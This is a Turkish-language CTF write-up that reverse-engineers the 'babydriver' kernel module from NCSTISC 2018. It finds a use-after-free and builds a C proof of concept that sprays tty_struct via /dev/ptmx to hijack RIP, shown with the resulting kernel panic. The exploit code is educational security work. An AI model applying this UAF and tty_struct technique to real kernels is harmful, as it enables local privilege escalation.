# Hedefimiz
Bu bölümde yine bir CTF challenge'ı çözüyor olacağız:

- **İsim**: NCSTISC 2018
- **Kaynak**: [Bu arşivden alınmıştır](https://github.com/anvbis/linux-x64_kernel_ctf/)
- **Link**: [challenge.tar.gz](../src/babydriver/challenge.tar.gz)

Hadi hiç vakit kaybetmeden analize geçelim.

# Kaynak Analizi
Bize verilen dosyalara baktığımızda, önceki challenge ile aynı isme sahip dosyalar görüyoruz.

Yine elimize bir `bzImage`, yani boot edilebilir kernel'imiz var. Bunun dışında önceki challenge'daki `run.sh` scriptine benzer olarak
bir `boot.sh` scripti söz konusu. CTF'in yapımıcısının kolaylık olması açısından eklediği bir QEMU başlatma scripti. Bunun dışında bir de
initramdisk dosya sistemi mevcut.

Fakat önceki bölümde olduğu gibi bir patch dosyası mevcut değil. Modifiye edilmiş kaynak kodundan derlenmiş olan `bzImage` bize verilmiş
olabilir. Ancak makineyi açtığımızda log'lardan görebileceğimiz gibi, external bir driver kullanılıyor:
```
[    1.569189] babydriver: module verification failed: signature and/or required key missing - tainting kernel
```
Bu modülü etrafa bakınca, `/lib/modules/4.4.72` altında buluyoruz. `babydriver.ko` isimli bu modülü inceleyelim, ne dersiniz?

### Kernel Modülleri
Kernel modülleri, runtime'da kernel'e yeni eklemeler yapmamızı sağlayan, bazen orjinal Linux kaynağı dışında (out-of-tree), bazen kayanağa
dahil binary'lerdir.

`file` komutu ile doğrulayabileceğimiz gibi, bunlar özünde ELF binary'leri:
```
ngn@blackarch:~/Desktop/ncstisc/babydriver# file babydriver.ko
babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped
```
Fakat `file` çıkıtısında, ve `readelf` ile ELF header'ında görebileceğimiz gibi sıradan ELF dinamik ya da statik binary'leri değil:
```
ngn@blackarch:~/Desktop/ncstisc/babydriver# readelf -h babydriver.ko
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              REL (Relocatable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          0 (bytes into file)
  Start of section headers:          201360 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           0 (bytes)
  Number of program headers:         0
  Size of section headers:           64 (bytes)
  Number of section headers:         38
  Section header string table index: 35
```
GÖrdüğünüz gibi `REL` yani `Relocatable file` olarak görünüyorlar. Bu özel bir ELF binary tipi. Basitçe kernel bu formatı belleğe yükledikten sonra, kullanılan
kernel sembollerinin adreslerini çözümlüyor ve binary'i yüklediği adrese göre ELF binary'sini kullandığı adresleri yeniden düzenliyor.

Bu sayede kernel modülleri, doğrudan kernel fonksiyonlarını kullanabiliyor ve ring 0'da sorunsuz çalışıyor. Kernel modüllerini yüklemek için `init_module()` ya da
`finit_module()` sistem çağrıları kullanılıyor. Ve modülü kaldırmak için de `delete_module()` çağrısı kullanılıyor. Tabiki de bir modül yüklemek herkesin yapabileceği
birşey değil, yüklediğiniz şey doğrudan kernel seviyesinde çalışacağından, bunu sistem çağrılarını genel olarak (`CAP_SYS_MODULE` gibi bazı istisnalar dışında) sadece
root kullanabiliyor.

Eğer kernel'in PID 1 olarak başlatığı ilk program olan `/init`i incelersek bu modülün başlangıçta root olarak yüklendiğini görebiliriz:
```bash
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```
Burada `insmod` çağrısı modülü yüklüyor. Benzer bir şekilde bir modül `rmmod` ile kaldırılabilir. Bu komutlar arkaplanda az önce bahsetiğimiz sistem çağrılarını
kullanıyor.

Peki modüler tam olarak nasıl çalışıyor? Bunu anlamak için biraz daha yakından bakmamız gerekecek, modülü Ghidra ile inceleyelim (ben sizin için buraya eklediğim
kaynak kodu bloklarını biraz temizledim):
```c
int babydriver_init(void)

{
  int iVar1;
  int err;
  long lVar2;

  iVar1 = alloc_chrdev_region(&babydev_no,0,1,"babydev");
  if (iVar1 < 0) {
    printk(&DAT_00100338);
    iVar1 = 1;
  }
  else {
    cdev_init(&cdev,&fops);
    cdev.owner = &__this_module;
    iVar1 = cdev_add(&cdev,babydev_no,1);
    if (iVar1 < 0) {
      printk(&DAT_00100356);
    }
    else {
      babydev_class = (class *)__class_create(&__this_module,"babydev",&babydev_no);
      if (babydev_class == (class *)0x0) {
        printk(&DAT_0010036a);
      }
      else {
        lVar2 = device_create(babydev_class,0,babydev_no,0,"babydev");
        if (lVar2 != 0) {
          return 0;
        }
        printk(&DAT_00100380);
        class_destroy(babydev_class);
      }
      cdev_del(&cdev);
    }
    unregister_chrdev_region(babydev_no,1);
  }
  return iVar1;
}
```
Bu `babydriver_init()` fonksiyonu, modül bahsetiğimiz sistem çağrıları ile yüklendiğinde kernel tarafından çağrılıyor. Kernel modüllerinin kaynak kodunda bu giriş
yani init fonksiyonu `module_init()` makrosu ile tanımlanıyor. Benzer bir şekilde `babydriver_exit()` fonksiyonu, modül bahsetiğimiz sistem çağrısı ile kaldırıldığında
çağrılıyor. Bu fonksiyon ise `module_exit()` makrosu ile tanımlanıyor:
```c
void babydriver_exit(void)

{
  device_destroy(babydev_class,babydev_no);
  class_destroy(babydev_class);
  cdev_del(&cdev);
  unregister_chrdev_region(babydev_no,1);
  return;
}
```
Eğer bu kaynak kdouna bakarsak, yeni bir karakter bloğu cihazı oluşturuluyor. Bu aslında `init` scriptinde gördüğümüz cihaz:
```bash
chmod 777 /dev/babydev
```
`init` bu cihazı herkes tarafından erişilebilir yapıyor. Bu da büyük ihtimalle zaafiyet bu cihazın impelementasyonu ile alakalı.

Bu cihazların, kernel modüllerinde nasıl implemente edildiğini görmek isterseniz, [bu harika rehberi okuyabilirsiniz](https://sysprog21.github.io/lkmpg/). Fakat özetle
bilmeniz gereken tek şey, her cihazın `read()`, `write()` ve `ioctl()` gibi temel dosya sistemi çağrılarını implemente ettiği. Farklı tipte cihazlar farklı çağrıları
implemente edebiliyor. Bu modülde kullanılan cihaz, `open()`, `read()`, `write()`, `ioctl()` ve `close()` çağrılarını, sırası ile `babyopen()`, `babyread()`, `babywrite()`,
`babyioctl()` ve `babyrelease()` çağrıları ile implemente etmiş. Yani biz bu `/dev/babydev` cihazını `open()` ile açtığımız zaman, kernel arkaplande `babyopen()`ı çağıracak,
açıktan sonra cihazdan `read()` ile okuduğumuz zaman `babyread()`i çağıracak vs.

Peki bu fonksiyonlar tam olarak nasıl atanıyor? Aslında gayet basit, bu karakter cihazı oluşturulurken yapılıyor. `alloc_chrdev_region()` ile karakter cihazı için bir major
seçiliyor, ve istenilen minor allocate ediliyor. Bu durumda sadece bir minor allocate ediliyor. Bu allocate edilen cihaz numaraları `babydev_no`da tutuluyor. Daha sonra
`cdev_init()` ile bir karakter cihazı oluşturuluyor. Bu cihaz `cdev`de tutulurken, ikinci parametre olarak verilen `fops` bu dosya fonksiyonlarını belirten yapı,
`file_operations` isimli bu yapıyı, [Linux'un kaynağında (4.4.72)](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/fs.h#L1641) görüntüleyebiliriz:
```c
struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
	ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
	int (*iterate) (struct file *, struct dir_context *);
	unsigned int (*poll) (struct file *, struct poll_table_struct *);
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
	int (*mmap) (struct file *, struct vm_area_struct *);
	int (*open) (struct inode *, struct file *);
...
```
Gerisini kendiniz de görebilirsiniz ama oldukça uzun bir yapı ve gördüğünüz gibi her çağrı için bir fonksiyon pointer'ı barındırıyor.

Bu modülde kullanılan `fops`u incelersek implemente ettiği her bir fonksiyon için içerdiği pointer'I görebiliriz. Bunu yapmak için, `init`
scriptini editleyip `setsid cttyhack setuidgid 1000 sh`'i sadece `sh` ile değiştirebilirsiniz. Bunu yapmak için QEMU scriptinde dosya sistemini çıkartıp sonra
tekrar sıkıştırabilirsiniz:
```bash
#!/bin/bash -e

mkdir -p dist && pushd dist
  gzip -cd ../rootfs.cpio | cpio -idm
  musl-gcc -static -o exploit.elf ../exploit.c
  find . | cpio --quiet -H newc -o | gzip -9 -n > ../rootfs_new.cpio.gz
popd

qemu-system-x86_64 -initrd rootfs_new.cpio.gz -kernel bzImage \
  -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
  -enable-kvm -monitor /dev/null -m 64M --nographic \
  -no-reboot -smp cores=1,threads=1 -cpu kvm64,+smep -s
```
Ayrıca burada birkaç yeni opsiyon eklediğimi görebilirsiniz, `-no-reboot` kernel'in çökmesi durumunda otomatik yeniden başlatmayı önleyecektir ve `-s`
uzaktan QEMU'da çalışan sistemi debug etmemizi sağlayacak. Bu script aynı zamanda rootfs'e bir exploit dosyasını derleyip ekliyor. Şimdilik bir exploit'imiz
olmadığından, `echo 'int main(){return 0;}' > exploit.c` şeklinde boş bir exploit oluşturabilirsiniz.

Root olarak giriş yaptıktan sonra `/proc/kallsysms`den modülün yüklediği adresi alabiliriz, bu dosya basitçe kernel sembollerinin root tarafından erişilebilir
şekilde export edildiği bir özel bir procfs sürücüsü:
```
/ # grep babydriver /proc/kallsyms
ffffffffc0000000 t babyrelease	[babydriver]
ffffffffc00024d0 b babydev_struct	[babydriver]
ffffffffc0000030 t babyopen	[babydriver]
ffffffffc0000080 t babyioctl	[babydriver]
ffffffffc00000f0 t babywrite	[babydriver]
ffffffffc0000130 t babyread	[babydriver]
ffffffffc0002440 b babydev_no	[babydriver]
ffffffffc0002460 b cdev	[babydriver]
ffffffffc0002440 b __key.30361	[babydriver]
ffffffffc0002448 b babydev_class	[babydriver]
ffffffffc0000170 t babydriver_exit	[babydriver]
ffffffffc0002000 d fops	[babydriver]
ffffffffc0002100 d __this_module	[babydriver]
ffffffffc0000170 t cleanup_module	[babydriver]
```
Buradaki adres `0xffffffffc0000000`, bunu kullanarak sembolleri doğru çözümleyebileceği şekilde `babydriver.ko`yu sembol dosyası olarak `gdb`ye ekleyebiliriz.
GDB'yi bu şekilde QEMU'ya bağlayıp çalıştırması için bir script yazdım:
```bash
#!/bin/bash

gdb -ex 'target remote localhost:1234' \
    -ex 'add-symbol-file ./babydriver.ko 0xffffffffc0000000'
```
`kallsysms`de aynı zamanda `fops`un adresini görüyoruz. Bu GDB ile inceleyebiliriz:
```
(gdb) x/10gx 0xffffffffc0002000
0xffffffffc0002000:	0xffffffffc0002100	0x0000000000000000
0xffffffffc0002010:	0xffffffffc0000130	0xffffffffc00000f0
0xffffffffc0002020:	0x0000000000000000	0x0000000000000000
0xffffffffc0002030:	0x0000000000000000	0x0000000000000000
0xffffffffc0002040:	0xffffffffc0000080	0x0000000000000000
```
Bunu `file_operations` ile karşılaştıralım, ilk başta `owner` pointerı olması lazım, `__this_module`un adresi `ffffffffc0002100` ve ghidra çıktısından hatırlarsanız,
`owner`ın adresi bu olamlı:
```c
    cdev_init(&cdev,&fops);
    cdev.owner = &__this_module;
    iVar1 = cdev_add(&cdev,babydev_no,1);
```
Ve GDB bunu doğruluyor. Sırada `llseek()`ın adresi olacak ve bu tanımlı olmadığından `NULL`, ardından `read()`in adresi var, ve bu adres `babyread()`in adresi ile uyuşuyor.
Gördüğünüz gibi bu yapı tüm çağrıların adreslerini tutuyor. Bu şekilde Linux modülün hangi fonksiyonunu çağırması gerektiğini biliyor. Bu karakter cihazı oluşturulduktan sonra
başta `alloc_chrdev_region()` ile aldığımız major ve minor'ı kullanacak şekilde cihazı, `cdev_add()` ile dosya sistemine ekliyoruz.

`babydriver_exit()`de bu oluşturduğumuz cihazları temizleyip aldığımız major ve minor'u serbest bırakmak gibi temizlik işleri yapıyor.

Artık modülü daha iyi anladığımıza göre dosya operasyonu çağrılarına bakabiliriz.

### Zaafiyeti Bulmak
İlk olarak `open()` çağrısına bakalım:
```c
int babyopen(inode *inode,file *filp)

{
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(_DAT_001010a8,0x24000c0,0x40);
  babydev_struct.device_buf_len = 0x40;
  printk("device open\n");
  return 0;
}
```
Basitçe, `babydev_struct` tutulacak, 64 byte bir bellek allocate ediyor. Bunun için bir cache kullanıyor, basitçe tekrar kullanılması amacı ile allocate edilen belleğin,
kernel tarafından bizim için saklanacağı bir alan. Cihazı ilk açtığımızda cache boş olacağından kernel, `kmalloc()` ile yapıtığı gibi kendisine belirtilen şekilde bellekden
istenilen miktar allocation yapacaktır. Biz bu bellek alanını, `kfree()` ile serbest bıraktığımızda bu cache'e eklenecektir. Daha sonra tekrar `kmem_cache_alloc_trace` ile
aynı cache'den bellek istediğimizde bu alan bize geri verilir.

`babydev_struct`ın `device_buf`ı allocate edilen adresi tutarken, `device_buf_len` allocate edilen alanı tutuyor. Ardından bir `dmesg` düşecek mesajı `printk` ile bastıktan sonra
0 değerini döndürüyor. Burada hangi değerin döndürüldüğü önemli, çünkü bu değer doğrudan sistem çağrısının dönüş değeri olarak kullanılacak.

Şimdi `ioctl()` çağrısına bakalım:
```c
long babyioctl(file *filp,uint command,ulong arg)

{
  long lVar1;

  if (command == 0x10001) {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)__kmalloc(arg,0x24000c0);
    babydev_struct.device_buf_len = arg;
    printk("alloc done\n");
    lVar1 = 0;
  }
  else {
    printk(&DAT_0010031a,arg);
    lVar1 = -0x16;
  }
  return lVar1;
}
```
`0x10001` komutunu kullanarak, istediğimiz boyutda `device_buf` için yeni bir allocation sağlayabiliyoruz gibi görünüyor. Ve önceden kullanılan bellek serbest bırakılıyor. `read()`
ve `write()` çağrıları da basitçe **belleğin boyutundan (`device_buf_len`) küçük olması şartı ile** bu `device_buf` belleğinden istediğimiz gibi okuma ve yazma yapmamıza izin veriyor
gibi görünüyor:
```c
ssize_t babyread(file *filp,char *buffer,size_t length,loff_t *offset)

{
  size_t sVar1;

  if (babydev_struct.device_buf != (char *)0x0) {
    sVar1 = 0xfffffffffffffffe;
    if (length < babydev_struct.device_buf_len) {
      _copy_to_user(buffer);
      sVar1 = length;
    }
    return sVar1;
  }
  return -1;
}

ssize_t babywrite(file *filp,char *buffer,size_t length,loff_t *offset)

{
  size_t sVar1;

  if (babydev_struct.device_buf != (char *)0x0) {
    sVar1 = 0xfffffffffffffffe;
    if (length < babydev_struct.device_buf_len) {
      _copy_from_user();
      sVar1 = length;
    }
    return sVar1;
  }
  return -1;
}
```
Burada bir out-of-bounds (OOB) read/write söz konusu değil çünkü belirtiğim gibi, okuma ve yazmanın boyutu, belleğin boyutundan küçük olmak zorunda.

Ha bu arada, gördüğünüz `_copy_from_user()` ve `_copy_to_user(buffer)` ghidra tarafından hatalı gösterilse de, basitçe bir belleği user-mode'dan kernel'e ve kernel'den
user-mode'a kopyalama özelliği sunan fonksiyonlar.

Yani şimdilik bu okuma ve yazma güvenli gibi görünüyor. Son olarak `close()` ile çağrılan `babyrelease()`e bakalım:
```c
int babyrelease(inode *inode,file *filp)

{
  kfree(babydev_struct.device_buf);
  printk("device release\n");
  return 0;
}
```
Tek yaptığı şey `device_buf`daki belleği `kfree()` ile serbest bırakmak.

Ve bazılarınız zaafiyeti çoktan buldu diye tahmin ediyorum. Hayır mı? Biraz yardımcı olayım, bu fonksiyon `babydev_struct.device_buf`ı `NULL` olarak değiştirmiyor.
Tabi, sıradaki `open()` ile yeniden bir bellek allocate edilecek, ancak biz bu `kfree()` ile belleği serbest bıraktığımız sırada, cihaz hala açık olabilir. Sonuçta
bir dosyayı aynı anda birden fazla işlem, hatta aynı işlem bile birden fazla kez açabilir değil mi?

Sanırım zaafiyeti bulduk!

# Exploit
Buradaki Use-After-Free (UAF) zafiyetini ilk olarak nasıl ortaya çıkarabileceğimize bakalım:
- `open()` ile dosyayı (`/dev/babydev`) aç
- `open()` ile dosyayı bir kere daha aç
- `close()` ile ilk açtığın dosyayı kapa
- İkinci açtığın dosya üzerinde `read()`/`write()` operasyonlarını kullan

Bu durumda cache'ye serbest bırakılan bellek üzerinde UAF'den kaynaklı, `read()`/`write()` ile yazma okuma yapabiliyor olacağız.
Ayrıca ikinci kere açtığımız dosyayı, diğeri gibi kapatırsak UAF zafiyeti double-free'ye sebebiyet verecktir. Ve bu da farklı bellek sorunları
oluşturabilir.

Fakat cache'de olan bir bellek üzerinde UAF pek bir işe yaramaz, cache'de olduğundan, bu bellek, spesifik olarak bu modülün `open()` çağrısı dışında
başka bir yerde kullanılmayacaktır.

İşte bu noktada `ioctl()` çağrısı ile bellek allocate edebildiğimiz gerçeğini kullanabiliriz:
- `open()` ile dosyayı (`/dev/babydev`) aç
- `open()` ile dosyayı bir kere daha aç
- `ioctl()` ile cache'siz bellek allocate et
- `close()` ile ilk açtığın dosyayı kapa
- İkinci açtığın dosya üzerinde `read()`/`write()` operasyonlarını kullan

`ioctl()` ile allocate ettiğimiz bellek, birçok farklı kernel fonksiyonu gibi doğrudan `kmalloc()` kullanıyor. Bu demek oluyor ki, biz bu belleği serbest bıraktıktan
sonra, bir kernel fonksiyonun, bu belleği kullanmaya başlaması oldukça mümkün. Ve UAF aracılığı ile bu kernel fonksiyonun kullandığı belleği modifiye edip kernel fonksiyonunu
kontrol etmeye çalışabiliriz.

Tabiki de bunu güvenilir bir şekilde yapabilmek için, bir kernel fonksiyonunu aynı belleği kullanmaya zorlamamız gerekebilir. Bunu yapmak için önce bir hedef seçmeliyiz.
Neyse ki, bu tarz saldırılar için [bilindik hedeflerden bir tanesi](https://santaclz.github.io/2024/01/20/Linux-Kernel-Exploitation-Heap-techniques.html) `tty_struct` objesi.

Linux'un pseudo termianl (pseudo TTY, PTY) implementasyonu, bazılarınızın bildiği gibi `/dev/ptmx` aracılığı ile sağlanıyor. Siz bir terminal açtığınızda, terminaliniz bu dosyası açıp,
bir master karakter cihazına erişim sağlıyor. Sizin terminal altında çalıştırdığınız programlar, `/dev/pts` altında bu master'a ait slave karakter cihazına yazarak ya da bu cihazdan
okuyarak terminal ile iletişim kuruyor.

Yani kernel, `ptmx` her açıldığında yeni bir çift karakter cihazı oluşturuyor. Bu karakter cihazlarını ve genel olarak farklı terminalleri takip etmek için, kernel `tty_struct`
objesini kullanıyor. Siz her bir terminal açtığınızda (yani her `/dev/ptmx`i açtığınızda), yeni bir `tty_struct`a ihtiyaç duyuluyor, ve tahmin edin kernel bunun için ne kullanıyor?
`kamlloc()`.

Yani allocate ettiğimiz bellek alanını, serbest bıraktıktan sonra, `/dev/ptmx`i açarak bir `tty_struct` tarafından kullanılmasını sağlarsak, bu objeyi okuyup modifiye edebiliriz.
Bu obje bu açıdan oldukça güzel, çünkü basitçe `/dev/ptmx`i açarak istediğimiz zaman allocate edebiliyoruz. Ancak bunun dışında, bu kernel versiyonunda, `tty_struct` objesinin başında
(**güncel versiyonlarda kaldırılan**) bir `magic` değeri mevcut:
```c
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;
...
```
Ve geçerli `tty_struct` objelerinde, bu değerin `0x5401` olması garanti:
```c
/* tty magic number */
#define TTY_MAGIC		0x5401
```
Bu da demek oluyor ki, sadece ilk 4 byte'I kontrol ederek, gerçekten de bir belleğin `tty_struct` tarafından kullanıldığını doğrulayabiliriz. Bunun yanı sıra (bu güncel versiyonlarda da
mevcut), her `tty_struct` objesinin bir `tty_operations` pointer'ı var. Ve bu size `file_opereations`ı hatırlatıyorsa doğru yoldasınız. Tıpkı `file_operations` yapısının farklı dosya
operasyonları için fonksiyon pointer'larını tutması gibi, `tty_operations` farklı TTY operasyonları için fonksiyon pointer'ları tutuyor:
```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
...
```
Yani bu yapı, `rip`i kontrol etmek için harika bir seçim.

Hadi bunu tam olarak nasıl yapabileceğimize bakalım:
- `close()` pointer'ı dikkat çekecek hatalı bir adrese işaret edecek bir sahte `tty_operations` yapısı oluştur
- `open()` ile dosyayı (`/dev/babydev`) aç
- `open()` ile dosyayı bir kere daha aç
- `ioctl()` ile cache'siz bellek allocate et, `tty_struct` tarafından kullanılma ihtimalini artırmak için `tty_struct` ile aynı boyutta olması önemli
- `close()` ile ilk açtığın dosyayı kapa
- `/dev/pmtx`i aç
- `read()` ile ikinci açtığımız dosyadan `tty_struct` boyutundan bir byte daha az okuma yap
- İlk 4 byte'ı magic ile karşılaştırarak `tty_struct` ile aynı belleği kullandığımızı doğrula
- `tty_operations`ı tutan `ops` pointer'ını sahte yapımıza işaret edecek şekilde değiştir
- `write()` ile modifiye edilmiş `tty_struct` objesini geri yaz
- `/dev/ptmx`i kapat

Bu adımları takip edersek `/dev/ptmx`i kapatığımız zaman, kernel sahte `tty_operations` yapısındaki, hatalı `close()` adresini kullanacağından,
hatalı bir adrese atlayacaktır, ve de bu durumda bir kernel panic yaşacağız.

Burada, `close()` seçmemizin sebebi, bu çağrının garanti olarak program çıkış yaptığında çağrılacak olması. Diğer çağrılardan birini seçersek,
`close()` pointer'ı geçersiz olacağından, program çıkış yaparken `close()`u çağırdığında (biz çağırmasak bile kernel işlemi temizlerken çağıracak)
bir kernel panik yaşanacaktır.

Her neyse, hadi bu planı pratiğe dökelim.

### `tty_struct`ın Boyutunu Öğrenmek
Eksik tek bir şey var, `tty_struct`ın boyutu. Bunu 4.4.72 versiyonunu indirip derledikten sonra, bu versiyon için basit bir modül derleyerek öğrenebiliriz:
```c
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/tty.h>

MODULE_LICENSE("GPL"); // lisansı belirtmek zorunlu

int init(void) {
  printk(KERN_INFO "tty_struct: %ld\n", sizeof(struct tty_struct));
  return 0;
}

void cleanup(void) {
}

// https://lore.kernel.org/lkml/20230118105215.B9DA960514@lion.mk-sys.cz/T/
module_init(init);
module_exit(cleanup);
```
Bunu derlemek için basit bir `Makefile` dosyası oluşturup, kaynağı derlediğiniz yola işaret edecek şekilde `-C` argümanını değiştirin:
```makefile
obj-m := main.o

all:
	$(MAKE) -C ../linux-4.4.72 M=$(PWD) modules
	rm -f *.order *.symvers *.mod *.mod.c *.o

clean:
	$(MAKE) -C ../linux-4.4.72 M=$(PWD) clean
```
Bu modülü, QEMU'da yükleyip çıktıya bakabilirsiniz, ya da daha kolay olması açısından basitçe `objdump` ile dissassembly'den boyutu çıkartabilirsiniz:
```
0000000000000000 <init>:
   0:	55                   	push   %rbp
   1:	be e0 02 00 00       	mov    $0x2e0,%esi
   6:	48 c7 c7 00 00 00 00 	mov    $0x0,%rdi
   d:	48 89 e5             	mov    %rsp,%rbp
  10:	e8 00 00 00 00       	call   15 <init+0x15>
  15:	31 c0                	xor    %eax,%eax
  17:	5d                   	pop    %rbp
  18:	c3                   	ret
```
Gördüğünüz gibi `rsi` yani ikinci parametre `0x2e0`, yani boyutumuz 736 byte.

### `rip`i Kontrol Etmek
Boyutu bildiğimize göre, hadi `rip`i bahsetiğimiz gibi kontrol etmeyi deneyelim:
```c
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <fcntl.h>
#include <stdio.h>

#define TTY_MAGIC 0x5401
#define BUF_SIZE  0x2e0

typedef struct {
  int counter;
} atomic_t;

struct kref {
  atomic_t refcount;
};

struct tty_struct {
  int                          magic;
  struct kref                  kref;
  struct device               *dev;
  struct tty_driver           *driver;
  const struct tty_operations *ops;
  // ...
};

struct tty_operations {
  struct tty_struct *(*lookup)(struct tty_driver *driver, void *inode, int idx);
  int (*install)(struct tty_driver *driver, struct tty_struct *tty);
  void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
  int (*open)(struct tty_struct *tty, void *filp);
  void (*close)(struct tty_struct *tty, void *filp);
  void (*shutdown)(struct tty_struct *tty);
  void (*cleanup)(struct tty_struct *tty);
  int (*write)(struct tty_struct *tty, const unsigned char *buf, int count);
  int (*put_char)(struct tty_struct *tty, unsigned char ch);
  void (*flush_chars)(struct tty_struct *tty);
  int (*write_room)(struct tty_struct *tty);
  int (*chars_in_buffer)(struct tty_struct *tty);
  int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
  // ...
};

int main() {
  int  fd1 = -1, fd2 = -1, ret = 0;
  char buf[BUF_SIZE - 1];

  fd1 = open("/dev/babydev", O_RDWR);
  fd2 = open("/dev/babydev", O_RDWR);
  bzero(buf, sizeof(buf));

  if (fd1 < 0 || fd2 < 0) {
    perror("open failed");
    goto done;
  }

  if ((ret = ioctl(fd1, 0x10001, BUF_SIZE)) < 0) {
    perror("ioctl failed");
    goto done;
  }

  close(fd1);
  fd1 = -1;

  if ((ret = read(fd2, buf, sizeof(buf))) < 0) {
    perror("read failed");
    goto done;
  }

  dump(buf, sizeof(buf));

  if ((fd1 = open("/dev/ptmx", O_RDONLY)) < 0) {
    perror("open failed (ptmx)");
    goto done;
  }

  if ((ret = read(fd2, buf, sizeof(buf))) < 0) {
    perror("read failed");
    goto done;
  }

  dump(buf, sizeof(buf));

  if (TTY_MAGIC != *(uint16_t *)buf) {
    puts("failed to obtain the tty_struct");
    goto done;
  }

  puts("obtained the tty_struct");

  struct tty_struct    *tty = (void *)buf;
  struct tty_operations ops;

  ops.close = (void *)0x424242;
  printf("new close: %p\n", ops.close);
  tty->ops = (void *)&ops;

  if ((ret = write(fd2, buf, sizeof(buf))) < 0) {
    perror("write failed");
    goto done;
  }

done:
  if (fd1 > 0)
    close(fd1);

  if (fd2 > 0)
    close(fd2);

  return EXIT_FAILURE;
}
```
Bunu çalıştırdığımızda, aldığımız panik mesajı, gerçekten de `rip`i kontrol ettiğimizi doğruluyor:
```
/ # ./crash.elf
[    4.140545] device open
[    4.155318] device open
[    4.165088] alloc done
[    4.170924] device release
obtained the tty_struct
new close: 0x424242
[    4.184259] BUG: unable to handle kernel paging request at 0000000000424242
[    4.188182] IP: [<0000000000424242>] 0x424242
[    4.188182] PGD 9f3067 PUD 9f4067 PMD 9f5067 PTE 0
[    4.188182] Oops: 0010 [#1] SMP
[    4.188182] Modules linked in: babydriver(OE)
[    4.188182] CPU: 0 PID: 90 Comm: crash.elf Tainted: G           OE   4.4.72 #1
[    4.188182] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.3-1-1 04/01/2014
[    4.188182] task: ffff880002b53300 ti: ffff880002b34000 task.ti: ffff880002b34000
[    4.188182] RIP: 0010:[<0000000000424242>]  [<0000000000424242>] 0x424242
[    4.188182] RSP: 0018:ffff880002b37de8  EFLAGS: 00010206
[    4.188182] RAX: 0000000000424242 RBX: ffff880002b75000 RCX: 0000000000000000
[    4.188182] RDX: 0000000000000000 RSI: ffff8800009d7b00 RDI: ffff880002b75000
[    4.188182] RBP: ffff880002b37e58 R08: ffff8800009d7b00 R09: 0000000000000000
[    4.188182] R10: ffff8800029ee2e8 R11: 0000000000000246 R12: ffff8800009d7b00
[    4.188182] R13: ffff8800029ee2e8 R14: ffff880002b601a0 R15: ffff880002b75400
[    4.188182] FS:  0000000000407758(0063) GS:ffff880003c00000(0000) knlGS:0000000000000000
[    4.188182] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.188182] CR2: 0000000000424242 CR3: 00000000009f1000 CR4: 00000000001006f0
[    4.188182] Stack:
[    4.188182]  ffffffff814d97c5 ffff880003174c80 ffff880003174ce0 ffff880003c16c30
[    4.188182]  ffff880002b53360 ffff880003c16bc0 0000000002b37e88 ffff880002b37e80
[    4.188182]  d50a6af892433b41 ffff8800009d7b00 0000000000000010 ffff8800029ee2e8
[    4.188182] Call Trace:
[    4.188182]  [<ffffffff814d97c5>] ? tty_release+0x105/0x580
[    4.188182]  [<ffffffff8120d2c4>] __fput+0xe4/0x220
[    4.188182]  [<ffffffff8120d43e>] ____fput+0xe/0x10
[    4.188182]  [<ffffffff8109dcf1>] task_work_run+0x81/0xa0
[    4.188182]  [<ffffffff81003242>] exit_to_usermode_loop+0xc2/0xd0
[    4.188182]  [<ffffffff81003c6e>] syscall_return_slowpath+0x4e/0x60
[    4.188182]  [<ffffffff81819d90>] int_ret_from_sys_call+0x25/0x8f
[    4.188182] Code:  Bad RIP value.
